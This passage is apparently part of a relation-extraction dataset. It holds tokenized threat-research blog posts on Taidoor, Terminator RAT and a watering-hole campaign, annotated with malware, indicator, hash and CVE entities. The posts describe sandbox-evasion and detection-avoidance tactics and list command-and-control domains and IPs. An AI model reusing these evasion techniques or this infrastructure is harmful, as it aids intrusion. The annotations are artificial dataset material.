"a", "list", "of", "CnC", "servers", "."], ["The", "content", "between", "the", "two", "markers", "\u201c", "XXXXX", "\u201d", "is", "encoded", "with", "base64", "and", "encrypted", "with", "the", "RC4", "cipher", "."], ["The", "encryption", "key", "is", "\u201c", "c37f12a0", "\u201d", "in", "hex", ",", "and", "hardcoded", "in", "the", "malware", "."], ["We", "extracted", "the", "following", "CnC", "servers", "from", "these", "blog", "posts", ":", "opp.gov.taiwans.tw", "nscnet.gov.medicare.tw", "mac.gov.skies.tw", "klserver.servehttp.com", "kllserver.serveftp.com"], ["202.142.153.154", "80.149.239.139", "202.142.172.131", "www.facebook.trickip", ".", "NET", "www.braintrust", ".", "AlmostMy", ".", "COM"], ["As", "with", "Taidoor", ",", "there", "appears", "to", "be", "a", "frequent", "association", "with", "Taiwan", ",", "in", "addition", "to", "a", "similar", "CnC", "naming", "scheme", "\u2013", "such", "as", "mac.gov.hpc.tw", "(", "Taidoor", ")", "and", "mac.gov.skies.tw", "(", "Taleret", ")", "."], ["Conclusion"], ["The", "Taidoor", "malware", "has", "been", "used", "to", "successfully", "compromise", "targets", "since", "2008", "."], ["This", "threat", "has", "evolved", "over", "time", ",", "and", "has", "recently", "leveraged", "Yahoo", "Blogs", "as", "a", "mechanism", "to", "drop", "the", "Taidoor", "malware", "as", "a", "\u201c", "second", "stage", "\u201d", "component", "."], ["In", "addition", ",", "the", "well", "-", "known", "Taidoor", "network", "traffic", "pattern", "has", "been", "modified", ",", "likely", "as", "a", "new", "way", "to", "avoid", "network", "-", "based", "detection", "."], ["Notes", "1", "."], ["http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/trojan_taidoortargeting_think_tanks.pdf", "2", "."], ["http://blog.trendmicro.com/trendlabs-security-intelligence/taidoor-update-taidoor-gang-tags-its-victims/", "and", "http://about-threats.trendmicro.com/us/spam/222/A%20Malware%20Treat%20this%20Halloween", "3", ".", "http://www.nartv.org/mirror/shadows-in-the-cloud.pdf", "and", "reports", "of", "associated", "malware", "here", "http://www.welivesecurity.com/2013/05/23/syndicasec-in-the-sin-bin/", "and", "here", "http://www.cybersquared.com/apt_targetedattacks_within_socialmedia/", "4", "."], ["MD5", "hashes", "of", "traditional", "Taidoor", "samples", "811aae1a66f6a2722849333293cbf9cd", "454c9960e89d02e4922245efb8ef6b49", "5efc35315e87fdc67dada06fb700a8c7"], ["bc69a262bcd418d194ce2aac7da47286"], ["This", "entry", "was", "posted", "on", "Fri", "Sep", "06", "04:00:06", "EDT", "2013", "and", "filed", "under", "Blog", ",", "Nart", "Villeneuve", ",", "Ned", "Moran", ",", "Thoufique", "Haq", ",", "Threat", "Intelligence", "and", "Threat", "Research", "."], ["Be", "the", "first", "to", "receive", "information", "on", "major", "cyber", "attacks", "from", "the", "industry", "leader", "!"], ["First", "Name"], ["Last", "Name", "Email", "Address"], ["Subscribe", "Cyber", "Security", "Fundamentals"], ["Careers", "Events", "Webinars", "Support"], ["Partners", "Newsroom", "Blog", "Investor", "Relations", "Incident", "?"], ["Contact", "Us", "Communication", "Preferences", "Report", "Security", "Issue", "Supplier", "Documents", "Facebook", "LinkedIn", "Twitter", "Google+"], ["YouTube", "Glassdoor", "Copyright", "\u00a9", "2015", "FireEye", ",", "Inc."], ["All", "rights", "reserved", "."], ["Privacy", "&", "Cookies", "Policy", "|", "Safe", "Harbor"]]}, {"vertexSet": [[{"name": "FireEye", "pos": [40, 41], "sent_id": 0, "type": "Organization"}], [{"name": "Taidoor", "pos": [6, 7], "sent_id": 1, "type": "MalwareFamily"}], [{"name": "Taiwan", "pos": [25, 26], "sent_id": 1, "type": "ExploitTargetObject"}], [{"name": "Terminator RAT", "pos": [9, 11], "sent_id": 2, "type": "Malware"}], [{"name": "Taiwan", "pos": [24, 25], "sent_id": 2, "type": "ExploitTargetObject"}], [{"name": "Taiwan", "pos": [18, 19], "sent_id": 3, "type": "ExploitTargetObject"}], [{"name": "103.doc", "pos": [15, 16], "sent_id": 4, "type": "Dropper"}], [{"name": "a130b2e578d82409021b3c9ceda657b7", "pos": [20, 21], "sent_id": 4, "type": "MD5"}], [{"name": "CVE-2012-0158", "pos": [25, 28], "sent_id": 4, "type": "Vulnerability"}], [{"name": "DW20.exe", "pos": [37, 38], "sent_id": 4, "type": "File"}], [{"name": "DW20.exe", "pos": [9, 10], "sent_id": 6, "type": "File"}], [{"name": "svchost_.exe", "pos": [3, 4], "sent_id": 9, "type": "Malware"}], [{"name": "sss.exe", "pos": [11, 12], "sent_id": 9, "type": "Malware"}], [{"name": "Terminator RAT", "pos": [7, 9], "sent_id": 12, "type": "Malware"}], [{"name": "FakeM RAT", "pos": [15, 17], "sent_id": 12, "type": "Malware"}], [{"name": "campaigns", "pos": [30, 31], "sent_id": 13, "type": "Campaign"}], [{"name": "Tibetan and Uyghur activists", "pos": [10, 14], "sent_id": 14, "type": "ExploitTargetObject"}], [{"name": "Taiwan", "pos": [25, 26], "sent_id": 14, "type": "ExploitTargetObject"}], [{"name": "Terminator RAT", "pos": [13, 15], "sent_id": 15, "type": "Malware"}], [{"name": "DW20.exe", "pos": [12, 13], "sent_id": 21, "type": "File"}], [{"name": "svchost_.exe", "pos": [12, 13], "sent_id": 23, "type": "Malware"}], [{"name": "sss.exe", "pos": [14, 15], "sent_id": 23, "type": "Malware"}], [{"name": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\\Startup", "pos": [21, 23], "sent_id": 24, "type": "Indicator"}], [{"name": "sss.exe", "pos": [4, 5], "sent_id": 26, "type": "Malware"}], [{"name": "ACCELORATOR", "pos": [21, 22], "sent_id": 26, "type": "Indicator"}], [{"name": "DW20.exe", "pos": [3, 4], "sent_id": 29, "type": "Malware"}], [{"name": "sss.exe", "pos": [0, 1], "sent_id": 32, "type": "Payload"}], [{"name": "liumingzhen.zapto.org", "pos": [7, 8], "sent_id": 46, "type": "Indicator"}], [{"name": "liumingzhen.myftp.org", "pos": [11, 12], "sent_id": 46, "type": "Indicator"}], [{"name": "Terminator", "pos": [1, 2], "sent_id": 49, "type": "Malware"}], [{"name": "103.doc", "pos": [7, 8], "sent_id": 49, "type": "File"}], [{"name": "a130b2e578d82409021b3c9ceda657b7", "pos": [12, 13], "sent_id": 49, "type": "MD5"}], [{"name": "zjz1020", "pos": [23, 24], "sent_id": 52, "type": "Campaign"}], [{"name": "liumingzhen.zapto.org", "pos": [14, 15], "sent_id": 54, "type": "Indicator"}], [{"name": "123.51.208.69", "pos": [16, 17], "sent_id": 54, "type": "Address"}], [{"name": "liumingzhen.myftp.org", "pos": [17, 18], "sent_id": 54, "type": "Indicator"}], [{"name": "123.51.208.69", "pos": [19, 20], "sent_id": 54, "type": "Address"}], [{"name": "Terminator", "pos": [20, 21], "sent_id": 55, "type": "Malware"}], [{"name": "50d5e73ff8a0693ed2ee2d320af3b304", "pos": [7, 8], "sent_id": 57, "type": "MD5"}], [{"name": "CVE-2012-0158", "pos": [10, 13], "sent_id": 57, "type": "Vulnerability"}], [{"name": "catlovers.25u.com", "pos": [22, 23], "sent_id": 57, "type": "Indicator"}], [{"name": "June 2013", "pos": [1, 3], "sent_id": 59, "type": "Time"}], [{"name": "Taiwan", "pos": [11, 12], "sent_id": 59, "type": "ExploitTargetObject"}], [{"name": "\u6a19\u6848\u8cc7\u6599.doc", "pos": [4, 5], "sent_id": 61, "type": "File"}], [{"name": "bfc96694731f3cf39bcad6e0716c5746", "pos": [9, 10], "sent_id": 61, "type": "MD5"}], [{"name": "CVE-2012-0158", "pos": [18, 21], "sent_id": 61, "type": "Vulnerability"}], [{"name": "WinData", "pos": [37, 38], "sent_id": 61, "type": "MalwareFamily"}], [{"name": "Protux", "pos": [32, 33], "sent_id": 65, "type": "Malware"}], [{"name": "August 2012", "pos": [5, 7], "sent_id": 66, "type": "Time"}], [{"name": "\u5e79!.doc", "pos": [12, 13], "sent_id": 66, "type": "File"}], [{"name": "01da7213940a74c292d09ebe17f1bd01", "pos": [17, 18], "sent_id": 66, "type": "MD5"}]], "labels": [{"r": "P7", "h": 3, "t": 8, "evidence": [2, 4]}, {"r": "P21", "h": 7, "t": 6, "evidence": [4]}, {"r": "P29", "h": 3, "t": 6, "evidence": [2, 4]}, {"r": "P7", "h": 6, "t": 8, "evidence": [4]}, {"r": "P21", "h": 9, "t": 6, "evidence": [4]}, {"r": "P22", "h": 15, "t": 13, "evidence": [12, 13]}, {"r": "P22", "h": 15, "t": 14, "evidence": [12, 13]}, {"r": "P27", "h": 15, "t": 16, "evidence": [13, 14]}, {"r": "P27", "h": 15, "t": 17, "evidence": [13, 14]}, {"r": "P21", "h": 19, "t": 18, "evidence": [15, 21]}, {"r": "P21", "h": 22, "t": 20, "evidence": [23, 24]}, {"r": "P21", "h": 22, "t": 21, "evidence": [23, 24]}, {"r": "P21", "h": 22, "t": 18, "evidence": [15, 24]}, {"r": "P21", "h": 24, "t": 23, "evidence": [26]}, {"r": "P13", "h": 25, "t": 26, "evidence": [29, 32]}, {"r": "P21", "h": 27, "t": 29, "evidence": [46, 49]}, {"r": "P21", "h": 28, "t": 29, "evidence": [46, 49]}, {"r": "P21", "h": 30, "t": 29, "evidence": [49]}, {"r": "P21", "h": 31, "t": 29, "evidence": [49]}, {"r": "P22", "h": 32, "t": 29, "evidence": [49, 52]}, {"r": "P21", "h": 33, "t": 29, "evidence": [49, 54]}, {"r": "P21", "h": 35, "t": 29, "evidence": [49, 54]}, {"r": "P28", "h": 29, "t": 34, "evidence": [49, 54]}, {"r": "P28", "h": 29, "t": 36, "evidence": [49, 54]}, {"r": "P21", "h": 38, "t": 37, "evidence": [55, 57]}, {"r": "P21", "h": 40, "t": 37, "evidence": [55, 57]}, {"r": "P21", "h": 43, "t": 37, "evidence": [55, 61]}, {"r": "P21", "h": 44, "t": 37, "evidence": [55, 61]}, {"r": "P7", "h": 37, "t": 39, "evidence": [55, 57]}, {"r": "P7", "h": 37, "t": 45, "evidence": [55, 61]}, {"r": "P21", "h": 49, "t": 47, "evidence": [65, 66]}, {"r": "P21", "h": 50, "t": 47, "evidence": [65, 66]}], "title": "201310FireEyeTerminator", "sents": [["Menu", "Home", "FireEye", "Blogs", "Threat", "Research", "Evasive", "Tactics", ":", "Terminator", "RAT", "Share", "October", "24", ",", "2013", "|", "by", "Geok", "Meng", "Ong", ",", "Nart", "Villeneuve", ",", "Chong", "Rong", "Hwa", "|", "Threat", "Intelligence", ",", "Threat", "Research", ",", "Advanced", "Malware", ",", "Targeted", "Attack", "FireEye", "Labs", "has", "been", "tracking", "a", "variety", "of", "advanced", "persistent", "threat", "(", "APT", ")", "actors", "that", "have", "been", "slightly", "changing", "their", "tools", ",", "techniques", ",", "and", "procedures", "(", "TTPs", ")", "in", "order", "to", "evade", "network", "defenses", "."], ["Earlier", ",", "we", "documented", "changes", "to", "Taidoor", ",", "a", "malware", "family", "that", "is", "being", "used", "in", "ongoing", "cyber", "-", "espionage", "campaigns", "particularly", "against", "entities", "in", "Taiwan", "."], ["In", "this", "post", "we", "will", "explore", "changes", "made", "to", "Terminator", "RAT", "(", "Remote", "Access", "Tool", ")", "by", "examining", "a", "recent", "attack", "against", "entities", "in", "Taiwan", "."], ["We", "recently", "analyzed", "a", "sample", "that", "we", "suspect", "was", "sent", "via", "spear", "-", "phishing", "emails", "to", "targets", "in", "Taiwan", "."], ["As", "shown", "in", "Figure", "1", ",", "the", "adversary", "sends", "a", "malicious", "Word", "document", ",", "\u201c", "103.doc", "\u201d", "(", "md5", ":", "a130b2e578d82409021b3c9ceda657b7", ")", ",", "that", "exploits", "CVE-2012", "-", "0158", ",", "which", "subsequently", "drops", "a", "malware", "installer", "named", "\u201c", "DW20.exe", "\u201d", "."], ["This", "particular", "malware", "is", "interesting", "because", "of", "the", "following", ":"], ["It", "evades", "sandbox", "by", "terminating", "and", "removing", "itself", "(", "DW20.exe", ")", "after", "installing", "."], ["Malicious", "behavior", "will", "only", "appear", "after", "reboot", "."], ["It", "deters", "single", "-", "object", "based", "sandbox", "by", "segregation", "of", "roles", "between", "collaborating", "malwares", "."], ["The", "RAT", "(", "svchost_.exe", ")", "will", "collaborate", "with", "its", "relay", "(", "sss.exe", ")", "to", "communicate", "with", "the", "command", "and", "control", "server", "."], ["It", "deters", "forensics", "investigation", "by", "changing", "the", "startup", "location", "."], ["It", "deters", "file", "-", "based", "scanning", "that", "implements", "a", "maximum", "file", "size", "filter", ",", "by", "expanding", "the", "size", "of", "svchost_.exe", "to", "40", "MB", "."], ["The", "ultimate", "payload", "of", "the", "attack", "is", "Terminator", "RAT", ",", "which", "is", "also", "known", "as", "FakeM", "RAT", "."], ["This", "RAT", "does", "not", "appear", "to", "be", "exclusively", "used", "by", "a", "single", "APT", "actor", ",", "but", "is", "most", "likely", "being", "used", "in", "a", "variety", "(", "of", "possibly", "otherwise", "unrelated", ")", "campaigns", "."], ["In", "the", "past", ",", "this", "RAT", "has", "been", "used", "against", "Tibetan", "and", "Uyghur", "activists", ",", "and", "we", "are", "seeing", "an", "increasing", "number", "of", "attacks", "targeting", "Taiwan", "as", "well", "."], ["However", ",", "these", "attacks", "use", "some", "evasive", "tactics", "that", "demonstrate", "the", "evolution", "of", "Terminator", "RAT", "."], ["First", ",", "the", "attackers", "have", "included", "a", "component", "that", "relays", "traffic", "between", "the", "malware", "and", "a", "proxy", "server", "."], ["Second", ",", "they", "have", "modified", "the", "32", "-", "byte", "magic", "header", "that", "in", "previous", "versions", "attempted", "to", "disguise", "itself", "to", "look", "like", "either", "MSN", "Messenger", ",", "Yahoo", "!"], ["Messenger", ",", "or", "HTML", "code", "."], ["These", "modifications", "appear", "to", "be", "an", "attempt", "to", "evade", "network", "defenses", ",", "perhaps", "in", "response", "to", "defender", "\u2019s", "increasing", "knowledge", "of", "the", "indicators", "of", "compromise", "associated", "with", "this", "malware", "."], ["We", "will", "discuss", "the", "individual", "components", "of", "this", "attack", "in", "more", "detail", "."], ["[", "caption", "id=\"attachment_3596", "\"", "align=\"alignnone", "\"", "width=\"585", "\"", "]", "Figure", "1[/caption", "]", "DW20.exe", "was", "found", "to", "be", "the", "installation", "executable", "file", "."], ["It", "will", "first", "create", "its", "working", "folders", "located", "at", "\u201c", "%", "UserProfile%\\Microsoft", "\u201d", "and", "\u201c", "%", "AppData%\\2019", "\u201d", "."], ["The", "former", "is", "used", "to", "store", "the", "configurations", "and", "executable", "files", "(", "svchost_.exe", "and", "sss.exe", ")", "and", "the", "latter", "is", "used", "to", "store", "the", "shortcut", "link", "files", "."], ["This", "folder", "\u201c", "2019", "\u201d", "was", "then", "configured", "to", "be", "the", "new", "start", "up", "folder", "location", "by", "changing", "the", "registry", "\u201c", "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell", "Folders\\Startup", "\"", "with", "the", "location", "of", "its", "path", "(", "see", "Figure", "2", ")", "."], ["[", "caption", "id=\"attachment_3597", "\"", "align=\"alignnone", "\"", "width=\"575", "\"", "]", "Figure", "2[/caption", "]"], ["The", "executable", "file", "\u201c", "sss.exe", "\u201d", "was", "found", "to", "be", "the", "decrypted", "form", "of", "the", "resource", "named", "140", "with", "type", "\u201c", "ACCELORATOR", "\u201d", "(", "likely", "misspelling", "of", "Accelerator", "-", "see", "Figure", "3", ")", "."], ["This", "resource", "was", "decrypted", "using", "customized", "XTEA", "algorithm", "and", "appended", "with", "an", "encrypted", "configuration", "for", "the", "domains", "and", "ports", "."], ["[", "caption", "id=\"attachment_3598", "\"", "align=\"alignnone", "\"", "width=\"307", "\"", "]", "Figure", "3[/caption", "]"], ["After", "installation", ",", "DW20.exe", "deletes", "and", "terminates", "itself", "."], ["The", "malwares", "will", "only", "run", "after", "reboot", "."], ["This", "is", "one", "effective", "way", "to", "evade", "sandbox", "automatic", "analysis", ",", "as", "malicious", "activity", "will", "only", "reveal", "after", "a", "reboot", "."], ["sss.exe", "is", "an", "interesting", "malware", "component", "."], ["As", "a", "researcher", "would", "analyze", "it", "independently", ",", "it", "is", "not", "considered", "a", "malicious", "program", "."], ["This", "component", "plays", "the", "role", "as", "a", "network", "relay", "between", "the", "malware", "and", "the", "proxy", "server", ",", "by", "listening", "over", "port", "8000", "."], ["To", "achieve", "this", ",", "it", "first", "tries", "to", "identify", "the", "list", "of", "proxy", "servers", "that", "are", "used", "within", "the", "system", "using", "\u201c", "WinHttpGetIEProxyConfigForCurrentUser", "\u201d", ",", "and", "the", "discovered", "proxy", "servers", "and", "related", "ports", "are", "stored", "in", "the", "same", "directory", "in", "a", "file", "named", "\u201c", "PROXY", "\u201d", "(", "see", "Figure", "4", ")", "."], ["[", "caption", "id=\"attachment_3599", "\"", "align=\"alignnone", "\"", "width=\"425", "\"", "]", "Figure", "4[/caption", "]"], ["When", "there", "is", "a", "new", "incoming", "TCP", "connection", "over", "port", "8000", ",", "it", "will", "attempt", "to", "create", "a", "local", "to", "proxy", "socket", "connection", "."], ["With", "that", ",", "it", "will", "check", "connectivity", "with", "the", "CnC", "server", "."], ["If", "the", "response", "is", "200", ",", "it", "will", "then", "start", "to", "create", "a", "\u201c", "relay", "link", "\u201d", "between", "the", "malware", "and", "the", "CnC", "server", "(", "see", "Figure", "5", ")", "."], ["The", "\u201c", "relay", "link", "\u201d", "was", "created", "using", "two", "threads", ",", "where", "one", "thread", "will", "transfer", "data", "from", "socket", "1", "to", "socket", "2", "(", "see", "Figure", "6", ")", "and", "the", "other", "will", "do", "vice", "versa", "."], ["[", "caption", "id=\"attachment_3600", "\"", "align=\"alignnone", "\"", "width=\"654", "\"", "]", "Figure", "5[/caption", "]", "[", "caption", "id=\"attachment_3601", "\"", "align=\"alignnone", "\"", "width=\"497", "\"", "]", "Figure", "6[/caption", "]"], ["As", "depicted", "in", "Figure", "7", ",", "the", "user", "agent", "is", "hard", "coded", "."], ["It", "is", "a", "possible", "means", "to", "identify", "potentially", "malicious", "traffic", ",", "as", "Internet", "Explorer", "6", "is", "significantly", "outdated", "and", "\u201c", "MSIE", "6.0.1.3", "\u201d", "is", "not", "a", "valid", "version", "token", "."], ["Figure", "7", "The", "configurations", "for", "the", "malicious", "domains", "and", "ports", "to", "use", "are", "located", "at", "the", "last", "188", "bytes", "of", "the", "executable", "file", "(", "see", "Figure", "8)", "."], ["The", "first", "16", "bytes", "is", "the", "key", "(", "boxed", "in", "red", ")", "to", "decrypt", "the", "remaining", "content", "using", "modified", "XTEA", "algorithm", "(", "see", "Figure", "9", ")", "."], ["The", "two", "malicious", "domains", "found", "were", "\u201c", "liumingzhen.zapto.org", "\u201d", "and", "\u201c", "liumingzhen.myftp.org", "\u201d"], ["[", "caption", "id=\"attachment_3603", "\"", "align=\"alignnone", "\"", "width=\"645", "\"", "]", "Figure", "8[/caption", "]"], ["[", "caption", "id=\"attachment_3604", "\"", "align=\"alignnone", "\"", "width=\"639", "\"", "]", "Figure", "9[/caption", "]"], ["The", "Terminator", "sample", "we", "analyzed", ",", "\u201c", "103.doc", "\u201d", "(", "md5", ":", "a130b2e578d82409021b3c9ceda657b7", ")", "was", "not", "configured", "with", "fake", "HTML", ",", "Yahoo", "Messenger", ",", "or", "Windows", "Messenger", "traffic", "header", "as", "it", "had", "in", "past", "variants", "."], ["However", ",", "the", "content", "is", "encrypted", "in", "exactly", "the", "same", "way", "as", "previous", "versions", "of", "Terminator", "RAT", "."], ["[", "caption", "id=\"attachment_3605", "\"", "align=\"alignnone", "\"", "width=\"648", "\"", "]", "Figure", "10[/caption", "]"], ["The", "decrypted", "content", "reveals", "that", "the", "malware", "is", "sending", "back", "the", "user", "name", ",", "the", "computer", "name", "and", "a", "campaign", "mark", "of", "\u201c", "zjz1020", "\u201d", "."], ["[", "caption", "id=\"attachment_3606", "\"", "align=\"alignnone", "\"", "width=\"683", "\"", "]", "Figure", "11[/caption", "]"], ["This", "particular", "sample", "is", "configured", "to", "one", "of", "two", "command", "and", "control", "servers", ":", "liumingzhen.zapto.org", "/", "123.51.208.69", "liumingzhen.myftp.org", "/", "123.51.208.69"], ["We", "have", "located", "another", "malicious", "document", "that", "has", "a", "Taiwan", "-", "related", "decoy", "document", "that", "drops", "this", "same", "version", "of", "Terminator", "RAT", "."], ["[", "caption", "id=\"attachment_3607", "\"", "align=\"alignnone", "\"", "width=\"583", "\"", "]", "Figure", "12[/caption", "]"], ["The", "sample", "we", "analyzed", "(", "md5", ":", "50d5e73ff8a0693ed2ee2d320af3b304", ")", "exploits", "CVE-2012", "-", "0158", "and", "has", "the", "following", "command", "and", "control", "server", ":", "catlovers.25u.com", "/", "123.51.208.142"], ["The", "command", "and", "control", "servers", "for", "both", "samples", "resolved", "to", "IP", "addresses", "in", "the", "same", "class", "C", "network", "."], ["In", "June", "2013", ",", "we", "investigated", "an", "attack", "against", "entities", "in", "Taiwan", "that", "used", "spear", "-", "phishing", "emails", "to", "deliver", "a", "malicious", "attachment", "."], ["[", "caption", "id=\"attachment_3608", "\"", "align=\"alignnone", "\"", "width=\"455", "\"", "]", "Figure", "13[/caption", "]"], ["The", "malicious", "attachment", "\"", "\u6a19\u6848\u8cc7\u6599.doc", "\"", "(", "md5", ":", "bfc96694731f3cf39bcad6e0716c5746", ")", "exploited", "a", "vulnerability", "in", "Microsoft", "Office", "(", "CVE-2012", "-", "0158", ")", ",", "however", ",", "the", "payload", "in", "this", "case", "was", "a", "different", "malware", "family", "known", "as", "WinData", "."], ["The", "malware", "connected", "to", "the", "same", "command", "and", "control", "server", ",", "liumingzhen.zapto.org", ",", "but", "the", "callback", "is", "quite", "different", ":", "XYZ", "/WinData", "."], ["DLL?HELO", "-", "STX-1", "*", "1[IP", "Address]*[Computer", "Name]*0605[MAC:[Mac"], ["Address]]$"], ["In", "a", "separate", "case", "where", "liumingzhen.zapto.org", "has", "been", "used", "as", "the", "command", "and", "control", "server", ",", "the", "payload", "was", "neither", "WinData", "nor", "Terminator", "RAT", ",", "but", "another", "type", "of", "malware", "known", "as", "Protux", "."], ["The", "sample", "we", "analyzed", "in", "August", "2012", "for", "this", "case", "was", "\u201c", "\u5e79!.doc", "\u201d", "(", "md5", ":", "01da7213940a74c292d09ebe17f1bd01", ")", "."], ["This", "particular", "threat", "actor", "has", "access", "to", "a", "variety", "of", "malware", "families", "and", "has", "been", "using", "them", "to", "target", "entities", "in", "Taiwan", "for", "more", "than", "a", "year", "."], ["Terminator", "RAT", "is", "an", "example", "of", "how", "malware", "are", "increasingly", "becoming", "more", "sophisticated", "and", "harder", "to", "detect", "."], ["There", "is", "a", "need", "for", "continual", "research", "to", "understand", "various", "techniques", ",", "tactics", ",", "and", "procedures", "used", "by", "the", "adversaries", "."], ["Detection", "of", "exploitation", "and", "identification", "of", "anomalous", "callbacks", "are", "becoming", "extremely", "critical", "in", "preventing", "the", "malware", "from", "installing", "into", "the", "system", "or", "phoning", "back", "to", "the", "command", "control", "servers", "."], ["This", "entry", "was", "posted", "on", "Thu", "Oct", "24", "20:08:13", "EDT", "2013", "and", "filed", "under", "Advanced", "Malware", ",", "Blog", ",", "Chong"], ["Rong", "Hwa", ",", "Geok", "Meng", "Ong", ",", "Nart", "Villeneuve", ",", "Targeted", "Attack", ",", "Threat", "Intelligence", "and", "Threat", "Research", "."], ["First", "Name", "Last", "Name"], ["Email", "Address", "Executive", "Perspective", "Blog", "Threat", "Research", "Blog", "Subscribe", "Cyber"], ["Security", "Fundamentals"], ["Careers", "Events", "Webinars", "Support"], ["Partners", "Newsroom", "Blog", "Investor", "Relations", "Incident", "?"], ["Contact", "Us", "Communication", "Preferences", "Report", "Security", "Issue", "Supplier", "Documents", "Facebook", "LinkedIn", "Twitter", "Google+"], ["YouTube", "Glassdoor", "Copyright", "\u00a9", "2016", "FireEye", ",", "Inc."], ["All", "rights", "reserved", "."], ["Privacy", "&", "Cookies", "Policy", "|", "Safe", "Harbor"]]}, {"vertexSet": [[{"name": "CVE-2014-0322", "pos": [8, 11], "sent_id": 0, "type": "Vulnerability"}], [{"name": "Veterans of Foreign Wars", "pos": [32, 36], "sent_id": 2, "type": "ExploitTargetObject"}], [{"name": "VFW", "pos": [37, 38], "sent_id": 2, "type": "ExploitTargetObject"}], [{"name": "CVE-2014-0322", "pos": [14, 17], "sent_id": 3, "type": "Vulnerability"}], [{"name": "ZxShell", "pos": [22, 23], "sent_id": 3, "type": "Malware"}], [{"name": "CrowdStrike Intelligence", "pos": [0, 2], "sent_id": 4, "type": "Organization"}], [{"name": "AURORA PANDA", "pos": [7, 9], "sent_id": 4, "type": "Attacker"}], [{"name": "2012", "pos": [15, 16], "sent_id": 5, "type": "Time"}], [{"name": "SWC", "pos": [16, 17], "sent_id": 5, "type": "Campaign"}], [{"name": "Capstone Turbine", "pos": [26, 28], "sent_id": 5, "type": "ExploitTargetObject"}], [{"name": "CrowdStrike Intelligence", "pos": [4, 6], "sent_id": 6, "type": "Organization"}], [{"name": "malicious iframe", "pos": [16, 18], "sent_id": 6, "type": "Malware"}], [{"name": "savmpet[.]com", "pos": [20, 21], "sent_id": 6, "type": "Indicator"}], [{"name": "gifas[.]assso[.]net", "pos": [5, 6], "sent_id": 7, "type": "Indicator"}], [{"name": "include.html", "pos": [16, 17], "sent_id": 7, "type": "File"}], [{"name": "Tope.swf", "pos": [18, 19], "sent_id": 7, "type": "File"}], [{"name": "Erido.jpg", "pos": [27, 28], "sent_id": 7, "type": "Payload"}], [{"name": "savmpet[.]com", "pos": [5, 6], "sent_id": 8, "type": "Indicator"}], [{"name": "Groupement des industries fran\u00e7aises a\u00e9ronautiques et spatiales", "pos": [17, 24], "sent_id": 9, "type": "ExploitTargetObject"}], [{"name": "GIFAS", "pos": [25, 26], "sent_id": 9, "type": "ExploitTargetObject"}], [{"name": "17 January 2014", "pos": [1, 4], "sent_id": 10, "type": "Time"}], [{"name": "ZxShell", "pos": [2, 3], "sent_id": 11, "type": "Malware"}], [{"name": "Sakula", "pos": [19, 20], "sent_id": 11, "type": "Malware"}], [{"name": "oa[.]ameteksen[.]com", "pos": [32, 33], "sent_id": 11, "type": "Indicator"}], [{"name": "GIFAS", "pos": [15, 16], "sent_id": 13, "type": "ExploitTargetObject"}], [{"name": "gifas[.]assso[.]net", "pos": [32, 33], "sent_id": 13, "type": "Indicator"}], [{"name": "173.252.252.204", "pos": [5, 6], "sent_id": 15, "type": "Address"}], [{"name": "savmpet[.]com", "pos": [10, 11], "sent_id": 15, "type": "Indicator"}], [{"name": "gifas[.]assso[.]net", "pos": [12, 13], "sent_id": 15, "type": "Indicator"}], [{"name": "savmpet[.]com", "pos": [26, 27], "sent_id": 16, "type": "Indicator"}], [{"name": "secure[.]safran-group[.]com", "pos": [28, 31], "sent_id": 16, "type": "Indicator"}], [{"name": "icbcqsz[.]com", "pos": [33, 34], "sent_id": 16, "type": "Indicator"}], [{"name": "secure[.]safran-group[.]com", "pos": [4, 7], "sent_id": 17, "type": "Indicator"}], [{"name": "Safran", "pos": [0, 1], "sent_id": 18, "type": "Organization"}], [{"name": "Sakula", "pos": [1, 2], "sent_id": 20, "type": "Malware"}], [{"name": "snecma[.]fr", "pos": [1, 2], "sent_id": 22, "type": "Indicator"}], [{"name": "Snecma", "pos": [9, 10], "sent_id": 22, "type": "Organization"}], [{"name": "217.108.170.0", "pos": [12, 13], "sent_id": 25, "type": "Address"}], [{"name": "secure[.]safran-group[.]com", "pos": [2, 5], "sent_id": 29, "type": "Indicator"}], [{"name": "Safran", "pos": [13, 14], "sent_id": 29, "type": "ExploitTargetObject"}], [{"name": "January 2013", "pos": [1, 3], "sent_id": 32, "type": "Time"}], [{"name": "Capstone Turbine", "pos": [15, 17], "sent_id": 32, "type": "ExploitTargetObject"}], [{"name": "CVE-2012-4792", "pos": [34, 37], "sent_id": 32, "type": "Vulnerability"}], [{"name": "Sakula", "pos": [12, 13], "sent_id": 34, "type": "Malware"}], [{"name": "Sakula", "pos": [4, 5], "sent_id": 35, "type": "Malware"}], [{"name": "Capstone Turbine", "pos": [1, 3], "sent_id": 36, "type": "ExploitTargetObject"}], [{"name": "Sakula", "pos": [0, 1], "sent_id": 37, "type": "Malware"}], [{"name": "61fe6f4cb2c54511f0804b1417ab3bd2", "pos": [7, 8], "sent_id": 37, "type": "MD5"}], [{"name": "web[.]vipreclod[.]com", "pos": [11, 12], "sent_id": 37, "type": "Indicator"}], [{"name": "c869c75ed1998294af3c676bdbd56851", "pos": [25, 26], "sent_id": 37, "type": "MD5"}], [{"name": "oa[.]ameteksen[.]com", "pos": [29, 30], "sent_id": 37, "type": "Indicator"}], [{"name": "gifas[.]assso[.]net", "pos": [7, 8], "sent_id": 40, "type": "Indicator"}]], "labels": [{"r": "P7", "h": 4, "t": 3, "evidence": [3]}, {"r": "P2", "h": 6, "t": 4, "evidence": [3, 4]}, {"r": "P33", "h": 8, "t": 7, "evidence": [5]}, {"r": "P27", "h": 8, "t": 9, "evidence": [5]}, {"r": "P21", "h": 12, "t": 11, "evidence": [6]}, {"r": "P21", "h": 13, "t": 11, "evidence": [6, 7]}, {"r": "P13", "h": 11, "t": 16, "evidence": [6, 7]}, {"r": "P21", "h": 14, "t": 11, "evidence": [6, 7]}, {"r": "P21", "h": 15, "t": 11, "evidence": [6, 7]}, {"r": "P21", "h": 23, "t": 22, "evidence": [11]}, {"r": "P28", "h": 22, "t": 26, "evidence": [11, 15]}, {"r": "P21", "h": 25, "t": 22, "evidence": [11, 13]}, {"r": "P21", "h": 27, "t": 22, "evidence": [11, 15]}, {"r": "P21", "h": 28, "t": 22, "evidence": [11, 15]}, {"r": "P21", "h": 32, "t": 34, "evidence": [17, 20]}, {"r": "P7", "h": 43, "t": 42, "evidence": [32, 34]}, {"r": "P21", "h": 48, "t": 46, "evidence": [37]}, {"r": "P21", "h": 49, "t": 46, 